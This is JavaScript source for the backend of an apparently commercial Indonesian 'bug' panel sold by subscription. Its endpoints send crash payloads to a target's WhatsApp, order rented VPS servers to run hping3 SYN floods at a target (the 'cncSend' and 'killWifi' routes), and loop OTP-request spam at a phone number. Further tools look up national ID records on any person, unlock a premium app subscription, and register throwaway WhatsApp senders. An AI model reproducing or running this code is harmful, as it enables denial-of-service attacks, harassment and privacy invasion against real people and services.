app.post('/api/auth/validate', (req, res) => { req.url = '/validate'; app.handle(req, res); });
app.get('/api/auth/myInfo', (req, res) => { req.url = '/myInfo'; app.handle(req, res); });

// --- /api/user/* ---
app.post('/api/user/changepass', (req, res) => { req.url = '/changepass'; app.handle(req, res); });
app.get('/api/user/createAccount', (req, res) => { req.url = '/createAccount?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.get('/api/user/deleteUser', (req, res) => { req.url = '/deleteUser?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.get('/api/user/listUsers', (req, res) => { req.url = '/listUsers?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.get('/api/user/userAdd', (req, res) => { req.url = '/userAdd?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.get('/api/user/editUser', (req, res) => { req.url = '/editUser?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.get('/api/user/getActivityLogs', (req, res) => { req.url = '/getLog?' + (req.url.split('?')[1]||''); app.handle(req, res); });

// --- /api/device-perm/* ---
app.get('/api/device/getPerms', (req, res) => { req.url = '/devicePerms?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.post('/api/device/setPerm', (req, res) => { req.url = '/setDevicePerm?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.get('/api/device/listPerms', (req, res) => { req.url = '/listDevicePerms?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.get('/api/whatsapp/getPublicSenders', (req, res) => { req.url = '/getPublicSenders?' + (req.url.split('?')[1]||''); app.handle(req, res); });

// --- /api/whatsapp/* ---
app.get('/api/whatsapp/sendBug', (req, res) => { req.url = '/sendBug?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.get('/api/whatsapp/mySender', (req, res) => { req.url = '/mySender?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.get('/api/whatsapp/getPairing', (req, res) => { req.url = '/getPairing?' + (req.url.split('?')[1]||''); app.handle(req, res); });

// /api/whatsapp/customBug - sama seperti sendBug tapi dengan qty, delay, senderType
app.get('/api/whatsapp/customBug', async (req, res) => {
  const { key, target: rawTarget, bug, qty, delay, senderType } = req.query;
  let target = (rawTarget || '').replace(/\D/g, '');
  console.log(`[📤 CUSTOM BUG] target=${target} bug=${bug} qty=${qty} delay=${delay}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: 'Invalid key' });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false, message: 'User not found' });

  const roleCooldowns = { member: 300, reseller: 240, reseller1: 60, owner: 0, vip: 60, dev: 0 };
  const role = user.role || 'member';
  const cooldownSeconds = roleCooldowns[role] || 60;
  const now = Date.now();
  const diffSeconds = Math.floor((now - (user.lastSend || 0)) / 1000);

  if (diffSeconds < cooldownSeconds) {
    return res.json({ valid: true, sended: false, cooldown: true, wait: cooldownSeconds - diffSeconds });
  }

  user.lastSend = now;
  saveDatabase(db);
  res.json({ valid: true, sended: true, cooldown: false, role });

  setImmediate(async () => {
    const sock = await checkActiveSessionInFolder(keyInfo.username);
    if (!sock) return;
    const targetJid = target + '@s.whatsapp.net';
    const sendQty = parseInt(qty) || 1;
    const sendDelay = parseInt(delay) || 1000;
    const bugList = bug ? bug.split(',').map(b => b.trim()) : [];
    for (let i = 0; i < sendQty; i++) {
      for (const b of bugList) {
        try {
          switch (b) {
            case 'crash_spam': await FreezePackk(sock, targetJid); await QcPay(sock, targetJid); await iosLx(sock, targetJid); break;
            case 'hard': await QcPay(sock, targetJid); await iosLx(sock, targetJid); await permenCall(sock, targetJid); await FreezePackk(sock, targetJid); break;
            case 'click': await FreezePackk(sock, targetJid); break;
            case 'android': await videoBlank(sock, targetJid); break;
            case 'invisible': await gsGlx(sock, targetJid); break;
            case 'ios_invis': await iosLx(sock, targetJid); break;
            case 'cxinv': await callCrash(sock, targetJid); break;
            case 'delay': await delayAxRRG(sock, targetJid); break;
            case 'ios_noinvis': await iOSxTend(sock, targetJid); break;
            default: await FreezePackk(sock, targetJid); break;
          }
        } catch (e) { console.warn('[⚠️ CUSTOM BUG]', e.message); }
      }
      if (i < sendQty - 1) await new Promise(r => setTimeout(r, sendDelay));
    }
  });
});

// /api/whatsapp/groupBug - alias raidGroup
app.get('/api/whatsapp/groupBug', (req, res) => { req.url = '/raidGroup?' + (req.url.split('?')[1]||''); app.handle(req, res); });

// --- /api/vps/* ---
app.get('/api/vps/myServer', (req, res) => { req.url = '/myServer?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.post('/api/vps/addServer', (req, res) => { req.url = '/addServer'; app.handle(req, res); });
app.post('/api/vps/delServer', (req, res) => { req.url = '/delServer'; app.handle(req, res); });
app.post('/api/vps/sendCommand', (req, res) => { req.url = '/sendCommand'; app.handle(req, res); });

// /api/vps/cncSend - kirim command flood ke VPS
app.get('/api/vps/cncSend', (req, res) => {
  const { key, target, ddos, port, duration } = req.query;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: 'Invalid session key' });

  const userVPS = vpsList.filter(vps => vps.owner === owner);
  if (!userVPS.length) return res.status(400).json({ error: 'No VPS available' });

  for (const vps of userVPS) {
    const conn = vpsConnections[vps.host];
    if (!conn) continue;
    const cmd = `screen -dmS cnc_${Date.now()} hping3 -S --flood ${target} -p ${port || 80}`;
    const kill = `sleep ${duration || 60}; pkill screen`;
    conn.exec(`${cmd} && ${kill}`, (err, stream) => {
      if (err) console.error('❌ cncSend exec error:', err.message);
    });
  }
  res.json({ success: true, message: `CNC sent to ${userVPS.length} VPS` });
});

// /killWifi - dipanggil langsung oleh wifi_external.dart
app.get('/killWifi', (req, res) => {
  const { key, target, duration } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: 'Invalid key' });
  const owner = getUserByKey(key);
  if (!owner) return res.json({ valid: false });
  const userVPS = vpsList.filter(vps => vps.owner === owner);
  if (!userVPS.length) return res.json({ valid: false, message: 'No VPS available' });
  for (const vps of userVPS) {
    const conn = vpsConnections[vps.host];
    if (!conn) continue;
    const cmd = `screen -dmS wifi_${Date.now()} hping3 -S --flood ${target} -p 80`;
    const kill = `sleep ${duration || 120}; pkill screen`;
    conn.exec(`${cmd} && ${kill}`, (err) => {
      if (err) console.error('killWifi exec error:', err.message);
    });
  }
  res.json({ valid: true, success: true, message: `Attack sent via ${userVPS.length} VPS` });
});

// --- /api/extra/* ---
app.get('/api/extra/prayer-times', async (req, res) => {
  const { latitude, longitude } = req.query;
  if (!latitude || !longitude) return res.json({ success: false, error: 'Missing latitude/longitude' });
  try {
    const r = await axios.get(`http://api.aladhan.com/v1/timings?latitude=${latitude}&longitude=${longitude}&method=11`);
    const t = r.data.data.timings;
    return res.json({
      success: true,
      valid: true,
      data: {
        fajr:    t.Fajr,
        sunrise: t.Sunrise,
        dhuhr:   t.Dhuhr,
        asr:     t.Asr,
        maghrib: t.Maghrib,
        isha:    t.Isha
      }
    });
  } catch (e) {
    return res.json({ success: false, valid: false, error: e.message });
  }
});

app.get('/api/extra/prayer-times/next', async (req, res) => {
  const { latitude, longitude } = req.query;
  if (!latitude || !longitude) return res.json({ success: false, error: 'Missing latitude/longitude' });
  try {
    const r = await axios.get(`http://api.aladhan.com/v1/timings?latitude=${latitude}&longitude=${longitude}&method=11`);
    const timings = r.data.data.timings;
    const now = new Date();
    const nowStr = now.toTimeString().slice(0, 5); // HH:MM
    const prayerOrder = ['Fajr','Dhuhr','Asr','Maghrib','Isha'];
    let nextPrayer = 'Fajr';
    let nextTime = timings['Fajr'];
    for (const p of prayerOrder) {
      if (timings[p] > nowStr) {
        nextPrayer = p;
        nextTime = timings[p];
        break;
      }
    }
    const currentTime = nowStr;
    return res.json({
      success: true,
      valid: true,
      data: {
        nextPrayer,
        time: nextTime,
        currentTime
      }
    });
  } catch (e) {
    return res.json({ success: false, valid: false, error: e.message });
  }
});

app.get('/api/extra/developers', (req, res) => {
  return res.json({
    valid: true,
    success: true,
    developers: [
      {
        name: 'ANDI',
        role: 'Lead Developer',
        description: 'Backend & Mobile Developer',
        telegram: '@andipmx',
        avatar: 'https://d.top4top.io/p_3756oyh031.jpg',
        color: '#B0BEC5'
      }
    ]
  });
});

app.get('/api/extra/developer/main', (req, res) => {
  return res.json({
    valid: true,
    success: true,
    creator: { name: 'andi', role: 'Lead Developer', email: 'admin@reza.panel-prvt.web.id', telegram: '@andipmx', website: 'http://arzzpanel.arzzhostingxcloud.my.id:2027', avatar: 'https://files.catbox.moe/default-avatar2.png' }
  });
});

// --- /api/tools/* ---
app.get('/api/tools/nik-check', async (req, res) => {
  const { key, nik } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ status: false, message: 'Invalid key' });
  try {
    const r = await axios.get(`https://api.siputzx.my.id/api/tools/kependudukan?nik=${nik}`);
    const raw = r.data;
    // Normalize to APK expected format
    const nikData = raw.data || raw;
    return res.json({
      status: true,
      valid: true,
      data: {
        data: {
          nik:          nikData.nik || nik,
          nama:         nikData.nama || nikData.name || 'N/A',
          kelamin:      nikData.kelamin || nikData.jenis_kelamin || 'N/A',
          tempat_lahir: nikData.tempat_lahir || nikData.birthplace || 'N/A',
          usia:         nikData.usia || nikData.age || 'N/A',
          provinsi:     nikData.provinsi || nikData.province || 'N/A',
          kabupaten:    nikData.kabupaten || nikData.city || 'N/A',
          kecamatan:    nikData.kecamatan || nikData.district || 'N/A',
          kelurahan:    nikData.kelurahan || nikData.village || 'N/A',
        },
        metadata: {
          source: 'siputzx',
          timestamp: new Date().toISOString()
        }
      }
    });
  } catch (e) {
    return res.json({ status: false, valid: false, error: e.message });
  }
});

app.get('/api/tools/subdomain-finder', async (req, res) => {
  const { key, domain } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ status: false, message: 'Invalid key' });
  try {
    const r = await axios.get(`https://api.siputzx.my.id/api/tools/subdomains?domain=${domain}`);
    const raw = r.data;
    // APK expects: { status: true, data: ['sub1', 'sub2'] }
    let subList = [];
    if (raw.data && Array.isArray(raw.data)) subList = raw.data;
    else if (Array.isArray(raw)) subList = raw;
    return res.json({ status: true, valid: true, data: subList });
  } catch (e) {
    return res.json({ status: false, valid: false, error: e.message });
  }
});

// --- /api/tools/chat/* ---
// chatSessionsData: { sessionId: { username, messages: [{message, isAI, timestamp}], lastModified, preview } }
const chatSessionsData = {};

app.get('/api/tools/chat/list', (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });
  const username = keyInfo.username;
  const chatHistoryList = Object.keys(chatSessionsData)
    .filter(id => chatSessionsData[id].username === username)
    .map(id => {
      const sess = chatSessionsData[id];
      return {
        sessionId: id,
        username: sess.username,
        lastModified: sess.lastModified || new Date().toISOString(),
        messageCount: (sess.messages || []).length,
        preview: sess.preview || 'No messages yet'
      };
    })
    .sort((a, b) => new Date(b.lastModified) - new Date(a.lastModified));
  return res.json({ valid: true, chatHistoryList });
});

app.get('/api/tools/chat/new-session', (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });
  const sessionId = keyInfo.username + '_' + Date.now();
  chatSessionsData[sessionId] = {
    username: keyInfo.username,
    messages: [],
    lastModified: new Date().toISOString(),
    preview: 'New conversation'
  };
  return res.json({ valid: true, sessionId });
});

app.get('/api/tools/chat/history', (req, res) => {
  const { key, session } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });
  const sess = chatSessionsData[session];
  if (!sess || sess.username !== keyInfo.username) return res.json({ valid: false, chatHistory: [] });
  return res.json({ valid: true, chatHistory: sess.messages || [] });
});

app.get('/api/tools/chat/delete', (req, res) => {
  const { key, session } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });
  delete chatSessionsData[session];
  return res.json({ valid: true });
});

app.get('/api/tools/chat/send', async (req, res) => {
  const { key, session, message } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ status: false, message: 'Invalid key' });
  if (!chatSessionsData[session]) {
    chatSessionsData[session] = { username: keyInfo.username, messages: [], lastModified: new Date().toISOString(), preview: '' };
  }
  const sess = chatSessionsData[session];
  const userMsg = { message: decodeURIComponent(message || ''), isAI: false, timestamp: new Date().toISOString() };
  sess.messages.push(userMsg);
  sess.preview = userMsg.message.slice(0, 50);
  sess.lastModified = new Date().toISOString();

  // Generate simple AI reply
  const reply = `Maaf, fitur AI Chat belum terhubung ke model. Pesan kamu: "${userMsg.message}"`;
  const aiMsg = { message: reply, isAI: true, timestamp: new Date().toISOString() };
  sess.messages.push(aiMsg);

  return res.json({ status: true, valid: true, data: { message: reply } });
});

// --- /api/tools/telegram/* ---
const telegramSessions = {};

app.get('/api/tools/telegram/sessions', (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });
  const userSess = Object.keys(telegramSessions)
    .filter(s => s.startsWith(keyInfo.username + '_'))
    .map(s => ({ session: s, phone: telegramSessions[s]?.phone || '' }));
  return res.json({ valid: true, sessions: userSess });
});

app.get('/api/tools/telegram/login', (req, res) => {
  const { key, phone } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });
  const loginId = keyInfo.username + '_' + phone + '_' + Date.now();
  telegramSessions[loginId] = { phone, status: 'pending', username: keyInfo.username };
  return res.json({ valid: true, loginId, message: 'Login initiated' });
});

app.get('/api/tools/telegram/auth', (req, res) => {
  const { key, loginId, input } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });
  if (telegramSessions[loginId]) telegramSessions[loginId].status = 'authenticated';
  return res.json({ valid: true, message: 'Auth submitted' });
});

app.get('/api/tools/telegram/status', (req, res) => {
  const { key, loginId } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });
  const sess = telegramSessions[loginId];
  return res.json({ valid: true, status: sess?.status || 'unknown' });
});

app.post('/api/tools/telegram/verify-session-password', (req, res) => {
  return res.json({ valid: true, message: 'Password verification not implemented' });
});

app.get('/api/tools/telegram/refresh-sessions', (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });
  return res.json({ valid: true, message: 'Sessions refreshed' });
});

app.get('/api/tools/telegram/remove-ses', (req, res) => {
  const { key, phone } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });
  const toDelete = Object.keys(telegramSessions).find(s => telegramSessions[s]?.phone === phone && telegramSessions[s]?.username === keyInfo.username);
  if (toDelete) delete telegramSessions[toDelete];
  return res.json({ valid: true });
});

app.post('/api/tools/telegram/spam-report', (req, res) => {
  return res.json({ valid: true, message: 'Spam report submitted' });
});

app.get('/api/tools/telegram/report-status', (req, res) => {
  const { key, reportId } = req.query;
  return res.json({ valid: true, status: 'processing', reportId });
});


app.get('/api/role-list', (req, res) => {
  const list = Object.keys(ROLE_PRICES).map(code => ({
    code: code,
    name: ROLE_NAME[code],
    price: ROLE_PRICES[code],
    priceFormatted: 'Rp' + ROLE_PRICES[code].toLocaleString(),
    duration: ROLE_DURATION[code],
    label: `${ROLE_NAME[code].toUpperCase()} / ${ROLE_DURATION[code] === 9999 ? 'Permanen' : ROLE_DURATION[code] + ' hari'}`,
  }));
  
  res.json({ success: true, roles: list });
});


app.post('/api/buy-role', async (req, res) => {
  const { username, password, role } = req.body;
  
  if (!username || !password || !role) {
    return res.json({ success: false, message: 'Username, password, role required' });
  }
  
  if (username.length < 3) {
    return res.json({ success: false, message: 'Username minimal 3 karakter' });
  }
  
  if (password.length < 4) {
    return res.json({ success: false, message: 'Password minimal 4 karakter' });
  }
  
  if (!ROLE_PRICES[role]) {
    return res.json({ success: false, message: 'Role tidak valid' });
  }
  
  const db = loadDatabase();
  
  if (db.find(u => u.username === username)) {
    return res.json({ success: false, message: 'Username sudah terdaftar!' });
  }
  
  const amount = ROLE_PRICES[role];
  const duration = ROLE_DURATION[role];
  const roleName = ROLE_NAME[role];
  
  try {
    const invoiceRes = await axios.get(
      `https://app.xentrapay.xyz/api/invoice?apikey=${XENTRA_API_KEY}&amount=${amount}`
    );
    
    const pendingFile = './pending_accounts.json';
    let pending = [];
    if (fs.existsSync(pendingFile)) {
      pending = JSON.parse(fs.readFileSync(pendingFile, 'utf8'));
    }
    
    const pendingData = {
      invoice_id: invoiceRes.data.invoice_id,
      username,
      password,
      role: roleName,
      role_duration: duration,
      role_code: role,
      amount,
      created_at: new Date().toISOString(),
    };
    
    pending.push(pendingData);
    fs.writeFileSync(pendingFile, JSON.stringify(pending, null, 2));
    
    res.json({
      success: true,
      invoice_id: invoiceRes.data.invoice_id,
      qris_image: invoiceRes.data.qris_image,
      payment_link: invoiceRes.data.payment_link,
      amount: invoiceRes.data.amount,
      fee: invoiceRes.data.fee,
      total: invoiceRes.data.total,
      expired_at: invoiceRes.data.expired_at,
      role: roleName,
      duration: duration,
      message: `Silakan bayar Rp${amount.toLocaleString()} untuk ${roleName.toUpperCase()} (${duration} hari)`
    });
    
  } catch (error) {
    res.json({ success: false, message: 'Gagal generate QRIS: ' + error.message });
  }
});


app.get('/api/check-payment', async (req, res) => {
  const { invoice_id } = req.query;
  
  if (!invoice_id) {
    return res.json({ success: false, message: 'Invoice ID required' });
  }
  
  try {
    const statusRes = await axios.get(
      `https://app.xentrapay.xyz/api/invoice/status?apikey=${XENTRA_API_KEY}&invoice_id=${invoice_id}`
    );
    
    const status = statusRes.data.status;
    
    if (status === 'paid') {
      const pendingFile = './pending_accounts.json';
      let pending = [];
      if (fs.existsSync(pendingFile)) {
        pending = JSON.parse(fs.readFileSync(pendingFile, 'utf8'));
      }
      
      const idx = pending.findIndex(p => p.invoice_id === invoice_id);
      
      if (idx !== -1) {
        const data = pending[idx];
        
        const db = loadDatabase();
        const expired = new Date();
        expired.setDate(expired.getDate() + data.role_duration);
        
        const newUser = {
          username: data.username,
          password: data.password,
          role: data.role,
          expiredDate: expired.toISOString().split('T')[0],
          pairId: genPairId(),
          balance: 0,
          created_at: new Date().toISOString(),
          role_code: data.role_code,
        };
        
        db.push(newUser);
        saveDatabase(db);
        
        pending.splice(idx, 1);
        fs.writeFileSync(pendingFile, JSON.stringify(pending, null, 2));
        
        const log = `${data.username} bought ${data.role} (${data.role_duration} days) for Rp${data.amount}\n`;
        fs.appendFileSync('transaction_log.txt', log);
        
        return res.json({
          success: true,
          status: 'paid',
          account_created: true,
          username: data.username,
          role: data.role,
          duration: data.role_duration,
          message: `✅ Akun ${data.username} (${data.role}) berhasil dibuat!`,
        });
      }
    }
    
    res.json({
      success: true,
      status: status,
      account_created: false,
      message: status === 'pending' ? '⏳ Menunggu pembayaran...' : 'Status: ' + status,
    });
    
  } catch (error) {
    res.json({ success: false, message: 'Gagal cek status: ' + error.message });
  }
});

let otpRunning = false;
let otpResults = {};

// ════════════════════════════════════════════════════════════════════════════
// ENDPOINT: /am/send — KIRIM MAGIC LINK
// ════════════════════════════════════════════════════════════════════════════

app.get("/am/send", async (req, res) => {
  const { key, email } = req.query;

  // Validasi key
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false, message: "User not found" });

  // Cek role
  const allowedRoles = [
    "owner", "dev", "tk", "tangan kanan", "admin",
    "reseller", "member", "vip", "moderator", "partner",
    "founder", "high admin", "high owner"
  ];
  const userRole = (user.role || "member").toLowerCase();
  if (!allowedRoles.includes(userRole)) {
    return res.json({ valid: false, message: "Access denied" });
  }

  // Validasi email
  if (!email || !email.includes("@")) {
    return res.json({ valid: false, message: "Valid email required" });
  }

  try {
    const result = await amSendMagicLink(email);

    // Simpan ke pending
    const pendingFile = "./am_pending.json";
    let pending = {};
    try {
      if (fs.existsSync(pendingFile)) {
        pending = JSON.parse(fs.readFileSync(pendingFile, "utf8"));
      }
    } catch (e) {}

    pending[email] = {
      email: email,
      requestedBy: user.username,
      requestedAt: new Date().toISOString(),
      status: "pending"
    };

    fs.writeFileSync(pendingFile, JSON.stringify(pending, null, 2));

    res.json({
      valid: true,
      message: "Magic link sent to " + email,
      email: email
    });

  } catch (e) {
    res.json({ valid: false, message: e.message });
  }
});


// ════════════════════════════════════════════════════════════════════════════
// ENDPOINT: /am/verify — VERIFY MAGIC LINK
// ════════════════════════════════════════════════════════════════════════════

app.post("/am/verify", express.json(), async (req, res) => {
  const { key, email, magicLink } = req.body;

  // Validasi key
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false, message: "User not found" });

  // Validasi input
  if (!email || !magicLink) {
    return res.json({ valid: false, message: "Email and magic link required" });
  }

  if (!magicLink.startsWith("http")) {
    return res.json({ valid: false, message: "Invalid magic link URL" });
  }

  try {
    const result = await amVerifyMagicLink(email, magicLink);

    // Simpan ke database
    const accountsFile = "./am_accounts.json";
    let accounts = {};
    try {
      if (fs.existsSync(accountsFile)) {
        accounts = JSON.parse(fs.readFileSync(accountsFile, "utf8"));
      }
    } catch (e) {}

    accounts[email] = {
      email: email,
      uid: result.uid,
      plan: result.planName,
      validUntil: result.validUntil,
      createdBy: user.username,
      createdAt: new Date().toISOString(),
      raw: result
    };

    fs.writeFileSync(accountsFile, JSON.stringify(accounts, null, 2));

    // Log
    fs.appendFileSync("am_log.txt", 
      "[" + new Date().toISOString() + "] " + user.username + " → " + email + " | UID: " + result.uid + " | Plan: " + result.planName + "\n"
    );

    res.json({
      valid: true,
      message: "Alight Motion Premium activated!",
      data: {
        email: email,
        uid: result.uid,
        plan: result.planName,
        validUntil: result.validUntil
      }
    });

  } catch (e) {
    res.json({ valid: false, message: e.message });
  }
});

app.get("/spamOtp", async (req, res) => {
  const { key, target, mode } = req.query;
  
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key" });
  
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false, message: "User not found" });
  
  if (!target) return res.json({ valid: false, message: "Target required" });
  
  const phone = normalizePhone(target);
  if (!phone) return res.json({ valid: false, message: "Invalid phone format" });
  
  if (otpRunning) return res.json({ valid: false, message: "OTP spam already running" });
  
  otpRunning = true;
  otpResults = { total: 0, success: 0, failed: 0, details: [] };
  
  res.json({ valid: true, message: "OTP spam started", totalHandlers: otpHandlerList.length });
  
  // Jalankan di background
  (async () => {
    try {
      let idx = 0;
      for (const handlerName of otpHandlerList) {
        idx++;
        const handler = otpHandlers[handlerName];
        try {
          const result = await handler(phone);
          otpResults.total++;
          if (result.success) {
            otpResults.success++;
            otpResults.details.push({ handler: handlerName, status: 'SUCCESS' });
          } else {
            otpResults.failed++;
            otpResults.details.push({ handler: handlerName, status: 'FAILED', error: result.error || '' });
          }
          console.log(`[OTP] ${idx}/${otpHandlerList.length} ${handlerName}: ${result.success ? '✅' : '❌'}`);
          await sleep(500);
        } catch (e) {
          otpResults.failed++;
          otpResults.details.push({ handler: handlerName, status: 'ERROR', error: e.message });
        }
      }
      otpRunning = false;
      console.log(`[OTP] Selesai. Success: ${otpResults.success}/${otpResults.total}`);
    } catch (e) {
      otpRunning = false;
      console.error('[OTP] Error:', e.message);
    }
  })();
});

app.get("/spamOtpAll", async (req, res) => {
  const { key, target } = req.query;
  
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key" });
  
  if (!target) return res.json({ valid: false, message: "Target required" });
  
  const phone = normalizePhone(target);
  if (!phone) return res.json({ valid: false, message: "Invalid phone format" });
  
  if (otpRunning) return res.json({ valid: false, message: "OTP spam already running" });
  
  otpRunning = true;
  otpResults = { total: 0, success: 0, failed: 0, details: [] };
  
  res.json({ valid: true, message: "OTP spam started (infinite mode)" });
  
  // Infinite loop
  (async () => {
    let round = 0;
    while (otpRunning) {
      round++;
      console.log(`[OTP] Round ${round} started`);
      let idx = 0;
      for (const handlerName of otpHandlerList) {
        idx++;
        const handler = otpHandlers[handlerName];
        try {
          const result = await handler(phone);
          otpResults.total++;
          if (result.success) {
            otpResults.success++;
          } else {
            otpResults.failed++;
          }
        } catch (e) {
          otpResults.failed++;
        }
        await sleep(300);
      }
      console.log(`[OTP] Round ${round} done. Total: ${otpResults.success}/${otpResults.total}`);
      await sleep(60000); // jeda 60 detik
    }
  })();
});

app.get("/getOtpStatus", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key" });
  
  res.json({
    valid: true,
    running: otpRunning,
    total: otpResults.total || 0,
    success: otpResults.success || 0,
    failed: otpResults.failed || 0,
    details: otpResults.details || []
  });
});

app.get("/stopOtp", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key" });
  
  otpRunning = false;
  res.json({ valid: true, message: "OTP spam stopped" });
});

// ─── NOKOS AUTO CREATE (FreeSMSProvider + WAManager) ────────────
// TARUH DI SINI ⬇️⬇️⬇️ (SEBELUM server.listen())

// ─── 1. CLASS FreeSMSProvider ─────────────────────────────────────

class FreeSMSProvider {
    constructor() {
        this.baseUrl = 'https://receive-sms.cc';
    }

    async getNumbers() {
        try {
            const { data } = await axios.get(this.baseUrl, {
                headers: { 'User-Agent': getRandomUserAgent() }
            });
            const $ = cheerio.load(data);
            const numbers = [];
            
            $('.number').each((i, el) => {
                const num = $(el).text().trim();
                if (num && num.length >= 10) {
                    numbers.push(num);
                }
            });
            
            return numbers.slice(0, 10);
        } catch (error) {
            console.error('[!] Gagal ambil nomor:', error.message);
            return [];
        }
    }

    async getSMS(number, timeout = 60000) {
        const start = Date.now();
        const url = `${this.baseUrl}/sms/${number}`;
        
        while (Date.now() - start < timeout) {
            try {
                const { data } = await axios.get(url, {
                    headers: { 'User-Agent': getRandomUserAgent() }
                });
                const $ = cheerio.load(data);
                
                let latestOtp = null;
                $('.message').each((i, el) => {
                    const text = $(el).text().trim();
                    const otpMatch = text.match(/\b\d{6}\b/);
                    if (otpMatch) {
                        latestOtp = {
                            otp: otpMatch[0],
                            message: text,
                            from: $(el).attr('data-sender') || 'unknown'
                        };
                    }
                });
                
                if (latestOtp) return latestOtp;
                
            } catch (error) {
                // ignore, retry
            }
            
            await sleep(5000);
        }
        
        return null;
    }
}

// ─── 2. CLASS WAManager ───────────────────────────────────────────

class WAManager {
    constructor() {
        this.sessions = {};
        this.socket = null;
    }

    async initSocket(nomor) {
        const sessionDir = `./sessions/${nomor}`;
        if (!fs.existsSync(sessionDir)) {
            fs.mkdirSync(sessionDir, { recursive: true });
        }

        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
        
        this.socket = makeWASocket({
            auth: state,
            printQRInTerminal: true,
            browser: ["Ubuntu", "Chrome", "122.0.0.0"]
        });

        this.socket.ev.on('creds.update', saveCreds);

        return new Promise((resolve) => {
            this.socket.ev.on('connection.update', async (update) => {
                const { connection, qr } = update;
                if (qr) {
                    console.log(`[QR] Scan QR untuk ${nomor}:`);
                    console.log(qr);
                }
                if (connection === 'open') {
                    console.log(`[+] WA ${nomor} connected!`);
                    this.sessions[nomor] = { status: 'connected', time: Date.now() };
                    resolve(this.socket);
                }
                if (connection === 'close') {
                    console.log(`[-] WA ${nomor} disconnected`);
                    resolve(null);
                }
            });
        });
    }

    async requestPairing(nomor) {
        try {
            const code = await this.socket.requestPairingCode(nomor);
            console.log(`[+] Pairing Code: ${code}`);
            return code;
        } catch (error) {
            console.error('[!] Gagal request pairing:', error.message);
            return null;
        }
    }
}

// ─── 3. INSTANCE GLOBAL ───────────────────────────────────────────

const smsProvider = new FreeSMSProvider();
const waManager = new WAManager();

// ─── 4. ENDPOINT NOKOS ────────────────────────────────────────────

// 4a. AMBIL DAFTAR NOMOR VIRTUAL
app.get('/api/nokos/numbers', async (req, res) => {
    const { key } = req.query;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.json({ valid: false, message: 'Invalid key' });

    try {
        const numbers = await smsProvider.getNumbers();
        res.json({ valid: true, numbers });
    } catch (error) {
        res.json({ valid: false, message: error.message });
    }
});

// 4b. AMBIL OTP DARI NOMOR TERTENTU
app.get('/api/nokos/otp', async (req, res) => {
    const { key, number } = req.query;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.json({ valid: false, message: 'Invalid key' });
    if (!number) return res.json({ valid: false, message: 'Number required' });

    try {
        const result = await smsProvider.getSMS(number, 30000);
        if (result) {
            res.json({ valid: true, otp: result.otp, message: result.message });
        } else {
            res.json({ valid: true, otp: null, message: 'Belum ada OTP' });
        }
    } catch (error) {
        res.json({ valid: false, message: error.message });
    }
});

// 4c. AUTO CREATE SENDER (PAIRING WA + OTP OTOMATIS)
app.post('/api/nokos/create-sender', async (req, res) => {
    const { key, number } = req.body;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.json({ valid: false, message: 'Invalid key' });
    if (!number) return res.json({ valid: false, message: 'Number required' });

    try {
        // 1. Request OTP dari receive-sms.cc
        const result = await smsProvider.getSMS(number, 60000);
        if (!result || !result.otp) {
            return res.json({ valid: false, message: 'OTP tidak ditemukan dalam 60 detik' });
        }

        // 2. Pairing WhatsApp pake OTP
        const socket = await waManager.initSocket(number);
        if (!socket) {
            return res.json({ valid: false, message: 'Gagal inisialisasi WA' });
        }

        const pairingCode = await waManager.requestPairing(number);
        if (!pairingCode) {
            return res.json({ valid: false, message: 'Gagal request pairing' });
        }

        // 3. Tambahin ke sender list user
        const db = loadDatabase();
